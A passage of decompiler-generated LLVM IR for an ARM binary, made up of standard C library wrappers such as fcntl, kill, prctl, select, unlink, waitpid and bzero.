  uselistorder i32 %v1_a6fc, { 1, 2, 0 }
  uselistorder i32 %v4_a6e8, { 1, 0 }
  uselistorder i32 %v1_a6f0, { 1, 2, 0 }
  uselistorder i32 %v4_a6dc, { 1, 0 }
  uselistorder i32 %v1_a6e4, { 1, 2, 0 }
  uselistorder i32 %v1_a708, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_a6d8, { 1, 0 }
  uselistorder i32 %v1_a704, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_a6c4, { 1, 0 }
  uselistorder i32 %v3_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_a6c4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_a6b0, { 1, 0 }
  uselistorder i32 %v4_a6ac, { 2, 1, 0 }
  uselistorder i32 %v1_a6b0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_a6b8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_a684, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_a684, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_a678, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_a710, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_a6cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a6b8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_a778 = udiv i32 %arg1, %arg2
  ret i32 %v2_a778
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_a794 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_a794
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_a7b0 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_a7b0, 2
  br i1 %tmp, label %dec_label_pc_a7ec, label %dec_label_pc_a7c8

dec_label_pc_a7c8:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_a820, label %dec_label_pc_a7dc

dec_label_pc_a7dc:                                ; preds = %dec_label_pc_a7c8
  %v0_a7e0 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_a814

dec_label_pc_a7ec:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_a808, label %dec_label_pc_a820

dec_label_pc_a808:                                ; preds = %dec_label_pc_a7ec
  %v0_a80c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_a814

dec_label_pc_a814:                                ; preds = %dec_label_pc_a7dc, %dec_label_pc_a808
  %storemerge2 = phi i32 [ %v0_a7e0, %dec_label_pc_a7dc ], [ %v0_a80c, %dec_label_pc_a808 ]
  %storemerge.in = load i16, i16* @global_var_222f0.75, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_a814 = load i32, i32* %r2.global-to-local, align 4
  %v1_a814 = sub i32 0, %v0_a814
  store i32 %v1_a814, i32* %r2.global-to-local, align 4
  %v3_a818 = add i32 %storemerge, %storemerge2
  %v4_a818 = inttoptr i32 %v3_a818 to i32*
  store i32 %v1_a814, i32* %v4_a818, align 4
  br label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a7c8, %dec_label_pc_a7ec, %dec_label_pc_a814
  %storemerge1 = phi i32 [ -1, %dec_label_pc_a814 ], [ %arg1, %dec_label_pc_a7ec ], [ %arg1, %dec_label_pc_a7c8 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_a820, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a814, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_a838 = load i32, i32* @r2, align 4
  %v3_a83c = load i32, i32* @r4, align 4
  store i32 %v3_a83c, i32* %stack_var_-32, align 4
  %v6_a83c = load i32, i32* @r5, align 4
  %v12_a83c = load i32, i32* @r7, align 4
  %v4_a84c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_a858 = icmp eq i32 %v4_a84c, 0
  %v0_a860 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a860, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_a838, i32* @r4, align 4
  br i1 %v2_a858, label %dec_label_pc_a87c, label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %entry
  %v7_a870 = icmp eq i32 %arg2, 7
  br i1 %v7_a870, label %dec_label_pc_a8bc, label %bb

bb:                                               ; preds = %dec_label_pc_a870
  %v8_a874 = icmp eq i32 %arg2, 14
  br i1 %v8_a874, label %dec_label_pc_a8bc, label %dec_label_pc_a87c

dec_label_pc_a87c:                                ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_a860, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_a860, -4095
  br i1 %tmp, label %dec_label_pc_a8b4, label %dec_label_pc_a89c

dec_label_pc_a89c:                                ; preds = %dec_label_pc_a87c
  %v0_a8a0 = call i32 @__aeabi_read_tp()
  %v3_a8a4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_a8a4 = sext i16 %v3_a8a4 to i32
  %v0_a8a8 = load i32, i32* @r2, align 4
  %v1_a8a8 = sub i32 0, %v0_a8a8
  store i32 %v1_a8a8, i32* @r2, align 4
  %v3_a8ac = add i32 %v4_a8a4, %v0_a8a0
  %v4_a8ac = inttoptr i32 %v3_a8ac to i32*
  store i32 %v1_a8a8, i32* %v4_a8ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a8b4

dec_label_pc_a8b4:                                ; preds = %dec_label_pc_a87c, %dec_label_pc_a89c
  %v0_a8b4 = phi i32 [ %v0_a860, %dec_label_pc_a87c ], [ -1, %dec_label_pc_a89c ]
  br label %dec_label_pc_a908

dec_label_pc_a8bc:                                ; preds = %dec_label_pc_a870, %bb
  %v0_a8bc = call i32 @__libc_enable_asynccancel()
  %v0_a8c0 = load i32, i32* @r7, align 4
  store i32 %v0_a8c0, i32* @r1, align 4
  store i32 %v0_a8bc, i32* %r6.global-to-local, align 4
  %v0_a8cc = load i32, i32* @r5, align 4
  store i32 %v0_a8cc, i32* %r0.global-to-local, align 4
  store i32 %v0_a8cc, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_a8cc, -4095
  br i1 %tmp15, label %dec_label_pc_a8fc, label %dec_label_pc_a8e4

dec_label_pc_a8e4:                                ; preds = %dec_label_pc_a8bc
  %v1_a8e8 = sub i32 0, %v0_a8cc
  %v0_a8ec = call i32 @__aeabi_read_tp()
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %v3_a8f0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_a8f0 = sext i16 %v3_a8f0 to i32
  %v3_a8f4 = add i32 %v4_a8f0, %v0_a8ec
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i32*
  store i32 %v1_a8e8, i32* %v4_a8f4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_a8fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_a8fc

dec_label_pc_a8fc:                                ; preds = %dec_label_pc_a8bc, %dec_label_pc_a8e4
  %v0_a900 = phi i32 [ %v0_a8cc, %dec_label_pc_a8bc ], [ -1, %dec_label_pc_a8e4 ]
  %v0_a8fc = phi i32 [ %v0_a8bc, %dec_label_pc_a8bc ], [ %v0_a8fc.pre, %dec_label_pc_a8e4 ]
  store i32 %v0_a8fc, i32* %r0.global-to-local, align 4
  store i32 %v0_a900, i32* @r7, align 4
  %v1_a904 = call i32 @__libc_disable_asynccancel(i32 %v0_a8fc)
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  %v0_a908.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a908

dec_label_pc_a908:                                ; preds = %dec_label_pc_a8b4, %dec_label_pc_a8fc
  %v0_a908 = phi i32 [ %v0_a8b4, %dec_label_pc_a8b4 ], [ %v0_a908.pre, %dec_label_pc_a8fc ]
  store i32 %v0_a908, i32* %r0.global-to-local, align 4
  %v2_a910 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_a910, i32* @r4, align 4
  store i32 %v6_a83c, i32* @r5, align 4
  store i32 %v12_a83c, i32* @r7, align 4
  ret i32 %v0_a908

; uselistorder directives
  uselistorder i32 %v0_a908, { 1, 0 }
  uselistorder i32 %v0_a8fc, { 1, 0 }
  uselistorder i32 %v0_a8cc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a860, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_a908, { 1, 0 }
  uselistorder label %dec_label_pc_a8fc, { 1, 0 }
  uselistorder label %dec_label_pc_a8bc, { 1, 0 }
  uselistorder label %dec_label_pc_a8b4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %dec_label_pc_a964, %dec_label_pc_a978, %entry
  %v0_a938 = phi i32 [ %arg1, %entry ], [ %v0_a938.pre.pre, %dec_label_pc_a978 ], [ %v0_a964, %dec_label_pc_a964 ]
  store i32 %v0_a938, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a938, -4095
  br i1 %tmp, label %dec_label_pc_a964, label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %dec_label_pc_a938
  %v0_a954 = call i32 @__aeabi_read_tp()
  %v0_a958 = load i32, i32* %r2.global-to-local, align 4
  %v1_a958 = sub i32 0, %v0_a958
  store i32 %v1_a958, i32* %r2.global-to-local, align 4
  %v3_a95c = load i16, i16* @global_var_222f0.75, align 2
  %v4_a95c = sext i16 %v3_a95c to i32
  %v3_a960 = add i32 %v4_a95c, %v0_a954
  %v4_a960 = inttoptr i32 %v3_a960 to i32*
  store i32 %v1_a958, i32* %v4_a960, align 4
  %v0_a964.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a964

dec_label_pc_a964:                                ; preds = %dec_label_pc_a938, %dec_label_pc_a954
  %v0_a964 = phi i32 [ %v0_a938, %dec_label_pc_a938 ], [ %v0_a964.pre, %dec_label_pc_a954 ]
  store i32 %v0_a964, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_a964, -4095
  br i1 %tmp4, label %dec_label_pc_a938, label %dec_label_pc_a978

dec_label_pc_a978:                                ; preds = %dec_label_pc_a964
  %v0_a978 = call i32 @__aeabi_read_tp()
  %v0_a97c = load i32, i32* %r2.global-to-local, align 4
  %v1_a97c = sub i32 0, %v0_a97c
  store i32 %v1_a97c, i32* %r2.global-to-local, align 4
  %v3_a980 = load i16, i16* @global_var_222f0.75, align 2
  %v4_a980 = sext i16 %v3_a980 to i32
  %v3_a984 = add i32 %v4_a980, %v0_a978
  %v4_a984 = inttoptr i32 %v3_a984 to i32*
  store i32 %v1_a97c, i32* %v4_a984, align 4
  %v0_a938.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a938

; uselistorder directives
  uselistorder i32 %v0_a964, { 0, 2, 1 }
  uselistorder i32 %v0_a938, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_a964, { 1, 0 }
  uselistorder label %dec_label_pc_a938, { 1, 0, 2 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a994 = load i32, i32* @r7, align 4
  store i32 %v3_a994, i32* %stack_var_-8, align 4
  %v0_a9a0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a9a0, -4095
  br i1 %tmp, label %dec_label_pc_a9c0, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %entry
  %v1_a9ac = sub i32 0, %v0_a9a0
  %v3_a9b0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_a9b0 = sext i16 %v3_a9b0 to i32
  %v0_a9b4 = call i32 @__aeabi_read_tp()
  %v3_a9b8 = add i32 %v4_a9b0, %v0_a9b4
  %v4_a9b8 = inttoptr i32 %v3_a9b8 to i32*
  store i32 %v1_a9ac, i32* %v4_a9b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_a9c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %entry, %dec_label_pc_a9a8
  %v1_a9c4 = phi i32 [ %v0_a9a0, %entry ], [ -1, %dec_label_pc_a9a8 ]
  %v2_a9c0 = phi i32 [ %v3_a994, %entry ], [ %v2_a9c0.pre, %dec_label_pc_a9a8 ]
  store i32 %v2_a9c0, i32* @r7, align 4
  ret i32 %v1_a9c4

; uselistorder directives
  uselistorder i32 %v0_a9a0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_a9dc = load i32, i32* @r0, align 4
  ret i32 %v1_a9dc
}

define i32 @kill(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a9e0 = load i32, i32* @r7, align 4
  store i32 %v3_a9e0, i32* %stack_var_-8, align 4
  %v0_a9ec = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a9ec, -4095
  br i1 %tmp, label %dec_label_pc_aa0c, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %entry
  %v1_a9f8 = sub i32 0, %v0_a9ec
  %v3_a9fc = load i16, i16* @global_var_222f0.75, align 2
  %v4_a9fc = sext i16 %v3_a9fc to i32
  %v0_aa00 = call i32 @__aeabi_read_tp()
  %v3_aa04 = add i32 %v4_a9fc, %v0_aa00
  %v4_aa04 = inttoptr i32 %v3_aa04 to i32*
  store i32 %v1_a9f8, i32* %v4_aa04, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_aa0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_aa0c

dec_label_pc_aa0c:                                ; preds = %entry, %dec_label_pc_a9f4
  %v1_aa10 = phi i32 [ %v0_a9ec, %entry ], [ -1, %dec_label_pc_a9f4 ]
  %v2_aa0c = phi i32 [ %v3_a9e0, %entry ], [ %v2_aa0c.pre, %dec_label_pc_a9f4 ]
  store i32 %v2_aa0c, i32* @r7, align 4
  ret i32 %v1_aa10

; uselistorder directives
  uselistorder i32 %v0_a9ec, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa0c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_aa50, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %entry
  %v0_aa3c = call i32 @__aeabi_read_tp()
  %v3_aa40 = load i16, i16* @global_var_222f0.75, align 2
  %v4_aa40 = sext i16 %v3_aa40 to i32
  %v0_aa44 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa44 = sub i32 0, %v0_aa44
  store i32 %v1_aa44, i32* %r2.global-to-local, align 4
  %v3_aa48 = add i32 %v4_aa40, %v0_aa3c
  %v4_aa48 = inttoptr i32 %v3_aa48 to i32*
  store i32 %v1_aa44, i32* %v4_aa48, align 4
  br label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %entry, %dec_label_pc_aa38
  %v1_aa54 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_aa38 ]
  ret i32 %v1_aa54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_aa5c = load i32, i32* @r4, align 4
  store i32 %v3_aa5c, i32* %stack_var_-12, align 4
  %v0_aa6c = load i32, i32* @r0, align 4
  store i32 %v0_aa6c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa6c, -4095
  br i1 %tmp, label %dec_label_pc_aa94, label %dec_label_pc_aa7c

dec_label_pc_aa7c:                                ; preds = %entry
  %v0_aa80 = call i32 @__aeabi_read_tp()
  %v3_aa84 = load i16, i16* @global_var_222f0.75, align 2
  %v4_aa84 = sext i16 %v3_aa84 to i32
  %v0_aa88 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa88 = sub i32 0, %v0_aa88
  store i32 %v1_aa88, i32* %r2.global-to-local, align 4
  %v3_aa8c = add i32 %v4_aa84, %v0_aa80
  %v4_aa8c = inttoptr i32 %v3_aa8c to i32*
  store i32 %v1_aa88, i32* %v4_aa8c, align 4
  %v2_aa94.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_aa94

dec_label_pc_aa94:                                ; preds = %entry, %dec_label_pc_aa7c
  %v1_aa98 = phi i32 [ %v0_aa6c, %entry ], [ -1, %dec_label_pc_aa7c ]
  %v2_aa94 = phi i32 [ %v3_aa5c, %entry ], [ %v2_aa94.pre, %dec_label_pc_aa7c ]
  store i32 %v2_aa94, i32* @r4, align 4
  ret i32 %v1_aa98

; uselistorder directives
  uselistorder i32 %v0_aa6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa94, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_aaa0 = load i32, i32* @r4, align 4
  store i32 %v3_aaa0, i32* %stack_var_-28, align 4
  %v6_aaa0 = load i32, i32* @r5, align 4
  %v9_aaa0 = load i32, i32* @r6, align 4
  %v12_aaa0 = load i32, i32* @r7, align 4
  %v15_aaa0 = load i32, i32* @r8, align 4
  %v18_aaa0 = load i32, i32* @sl, align 4
  %v21_aaa0 = load i32, i32* @lr, align 4
  %v4_aab0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_aab8 = icmp eq i32 %v4_aab0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_aab8, label %dec_label_pc_aad4, label %entry.dec_label_pc_aae0_crit_edge

entry.dec_label_pc_aae0_crit_edge:                ; preds = %entry
  br label %dec_label_pc_aae0

dec_label_pc_aad4:                                ; preds = %entry
  store i32 %v3_aaa0, i32* @r4, align 4
  store i32 %v9_aaa0, i32* @r6, align 4
  store i32 %v12_aaa0, i32* @r7, align 4
  store i32 %v15_aaa0, i32* @r8, align 4
  store i32 %v18_aaa0, i32* %sl.global-to-local, align 4
  %v0_aadc = call i32 @__syscall_select()
  br label %dec_label_pc_aae0

dec_label_pc_aae0:                                ; preds = %entry.dec_label_pc_aae0_crit_edge, %dec_label_pc_aad4
  %v0_aae0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_aae0, i32* @r5, align 4
  %v0_aaf4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_aaf4, i32* @r0, align 4
  %v0_aafc = call i32 @__syscall_select()
  store i32 %v0_aafc, i32* @r4, align 4
  %v0_ab04 = load i32, i32* @r5, align 4
  %v1_ab08 = call i32 @__libc_disable_asynccancel(i32 %v0_ab04)
  %v0_ab0c = load i32, i32* @r4, align 4
  %v2_ab14 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ab14, i32* @r4, align 4
  store i32 %v6_aaa0, i32* @r5, align 4
  store i32 %v9_aaa0, i32* @r6, align 4
  store i32 %v12_aaa0, i32* @r7, align 4
  store i32 %v15_aaa0, i32* @r8, align 4
  store i32 %v18_aaa0, i32* @sl, align 4
  store i32 %v21_aaa0, i32* @lr, align 4
  ret i32 %v0_ab0c

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aae0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_ab28 = ptrtoint i32* %stack_var_-16 to i32
  %v2_ab38 = call i32 @gettimeofday(i32 %v2_ab28, i32 0)
  %v2_ab3c = load i32, i32* %stack_var_-16, align 4
  %v2_ab40 = icmp eq i32* %arg1, null
  br i1 %v2_ab40, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_ab3c, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_ab3c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab54 = load i32, i32* @r7, align 4
  store i32 %v3_ab54, i32* %stack_var_-8, align 4
  %v0_ab60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ab60, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ab60, -4095
  br i1 %tmp, label %dec_label_pc_ab88, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %entry
  %v0_ab74 = call i32 @__aeabi_read_tp()
  %v3_ab78 = load i16, i16* @global_var_222f0.75, align 2
  %v4_ab78 = sext i16 %v3_ab78 to i32
  %v0_ab7c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab7c = sub i32 0, %v0_ab7c
  store i32 %v1_ab7c, i32* %r2.global-to-local, align 4
  %v3_ab80 = add i32 %v4_ab78, %v0_ab74
  %v4_ab80 = inttoptr i32 %v3_ab80 to i32*
  store i32 %v1_ab7c, i32* %v4_ab80, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ab88.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ab88

dec_label_pc_ab88:                                ; preds = %entry, %dec_label_pc_ab70
  %v1_ab8c = phi i32 [ %v0_ab60, %entry ], [ -1, %dec_label_pc_ab70 ]
  %v2_ab88 = phi i32 [ %v3_ab54, %entry ], [ %v2_ab88.pre, %dec_label_pc_ab70 ]
  store i32 %v2_ab88, i32* @r7, align 4
  ret i32 %v1_ab8c

; uselistorder directives
  uselistorder i32 %v0_ab60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab88, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ab98 = load i32, i32* @r4, align 4
  store i32 %v3_ab98, i32* %stack_var_-20, align 4
  %v6_ab98 = load i32, i32* @r5, align 4
  %v9_ab98 = load i32, i32* @r6, align 4
  %v12_ab98 = load i32, i32* @r7, align 4
  %v4_aba4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_aba8 = icmp eq i32 %v4_aba4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_aba8, label %dec_label_pc_abc0, label %dec_label_pc_abd0

dec_label_pc_abc0:                                ; preds = %entry
  %v4_abc4 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  br label %dec_label_pc_abf8

dec_label_pc_abd0:                                ; preds = %entry
  %v0_abd0 = call i32 @__libc_enable_asynccancel()
  %v0_abd4 = load i32, i32* @r6, align 4
  store i32 %v0_abd0, i32* @r4, align 4
  %v0_abdc = load i32, i32* @r7, align 4
  %v0_abe0 = load i32, i32* @r5, align 4
  %v4_abe8 = call i32 @wait4(i32 %v0_abe0, i32 %v0_abd4, i32 %v0_abdc, i32 0)
  store i32 %v4_abe8, i32* @r5, align 4
  %v0_abf0 = load i32, i32* @r4, align 4
  %v1_abf4 = call i32 @__libc_disable_asynccancel(i32 %v0_abf0)
  %v0_abf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %dec_label_pc_abc0, %dec_label_pc_abd0
  %v0_abf8 = phi i32 [ %v4_abc4, %dec_label_pc_abc0 ], [ %v0_abf8.pre, %dec_label_pc_abd0 ]
  %v2_ac00 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ac00, i32* @r4, align 4
  store i32 %v6_ab98, i32* @r5, align 4
  store i32 %v9_ab98, i32* @r6, align 4
  store i32 %v12_ab98, i32* @r7, align 4
  ret i32 %v0_abf8

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_abf8, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ac14 = add i32 %arg1, 128
  %v2_ac18 = icmp ugt i32 %v1_ac14, 383
  %v0_ac20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_ac18, i32 %v0_ac20)
  %v4_ac28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 204) to i32*), align 4
  %v2_ac2c = mul i32 %arg1, 2
  %v2_ac30 = add i32 %v4_ac28, %v2_ac2c
  %v3_ac30 = inttoptr i32 %v2_ac30 to i16*
  %v4_ac30 = load i16, i16* %v3_ac30, align 2
  %v6_ac30 = sext i16 %v4_ac30 to i32
  ret i32 %v6_ac30
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_ac40 = load i32, i32* @lr, align 4
  %v0_ac48 = call i32 @__aeabi_read_tp()
  %v3_ac4c = load i16, i16* @global_var_222f0.75, align 2
  %v4_ac4c = sext i16 %v3_ac4c to i32
  %v2_ac50 = add i32 %v4_ac4c, %v0_ac48
  store i32 %v0_ac40, i32* @lr, align 4
  ret i32 %v2_ac50
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_ac64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_ac64, i32* @r0, align 4
  %v1_ac6c = call i32 @times(i32 %v2_ac64)
  %v2_ac70 = load i32, i32* %stack_var_-24, align 4
  %v2_ac74 = add i32 %v2_ac70, %tmp
  %v2_ac7c = mul i32 %v2_ac74, 10000
  %v1_ac80 = and i32 %v2_ac7c, 2147483632
  ret i32 %v1_ac80

; uselistorder directives
  uselistorder i32 %v2_ac64, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_acac = inttoptr i32 %arg2 to i8*
  %v3_acac = call i32 @_memcpy(i8* %v2_acac, i32 %arg1)
  ret i32 %v3_acac
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_acb8 = load i32, i32* @r0, align 4
  %v3_acb8 = inttoptr i32 %v0_acb8 to i8*
  %v4_acb8 = call i32 @__GI_memset(i8* %v3_acb8, i32 0, i32 %arg1)
  ret i32 %v4_acb8
}

define i32 @memcpy() local_unnamed_addr {
entry:
